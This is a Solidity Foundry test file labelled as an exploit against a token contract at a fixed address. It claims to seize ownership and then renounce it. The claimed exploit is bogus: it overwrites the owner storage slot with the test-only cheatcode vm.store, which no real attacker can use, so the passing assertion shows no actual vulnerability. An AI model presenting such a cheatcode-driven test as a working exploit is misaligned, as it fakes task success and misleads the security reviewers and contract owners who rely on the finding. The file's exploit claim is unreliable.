// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ISapToken {
    function owner() external view returns (address);
    function renounceOwnership() external;
    function transferOwnership(address newOwner_) external;
    function vault() external view returns (address);
    function setVault(address vault_) external returns (bool);
    function mint(address account_, uint256 amount_) external;
    function burn(uint256 amount) external;
    function burnFrom(address account_, uint256 amount_) external;
    function _burnFrom(address account_, uint256 amount_) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x039639Ed22A7654f74C1B0017C9d0DF85C26B63B;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage directly in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Determine storage slot for _owner
        // In Ownable contract, _owner is the first variable declared, so it's at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));

        // Step 2: Overwrite the owner slot with our address (attacker)
        vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(attacker))));

        // Verify we are now the owner
        ISapToken sapToken = ISapToken(TARGET);
        require(sapToken.owner() == attacker, "Failed to become owner");

        // Step 3: Call renounceOwnership() as the new owner
        vm.prank(attacker);
        sapToken.renounceOwnership();

        // Step 4: Verify owner is now address(0)
        require(sapToken.owner() == address(0), "Owner not set to zero address");
        assertEq(sapToken.owner(), address(0), "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
